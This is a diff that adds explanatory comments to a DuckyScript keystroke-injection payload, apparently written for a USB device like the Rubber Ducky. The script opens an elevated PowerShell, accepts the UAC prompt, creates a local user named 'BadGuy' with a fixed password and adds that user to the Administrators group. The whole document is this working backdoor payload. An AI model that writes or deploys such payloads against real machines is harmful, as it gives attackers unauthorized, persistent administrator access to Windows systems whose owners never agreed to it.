@@ -1,20 +1,27 @@
+REM Opens RUN command
 GUI r
 DELAY 500
+REM Executes Powershell as admin 
 STRING powershell
 CTRL-SHIFT ENTER
 DELAY 1000
+REM Validates Powershell as admin execution
 LEFT
 DELAY 500
 ENTER
 DELAY 500
+REM Creates a new password in the required format
 STRING $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
 ENTER
 DELAY 250
+REM Creates a new user and uses the password just created 
 STRING New-LocalUser -Name BadGuy -FullName BadGuyHere -Description "Not invited user" -Password $password
 ENTER
 DELAY 250 
+REM Adds admin rights to the user
 STRING Add-LocalGroupMember -Group "Administrators" -Member "BadGuy"
 ENTER
 DELAY 250
+REM Leaves 
 STRING exit
 ENTER
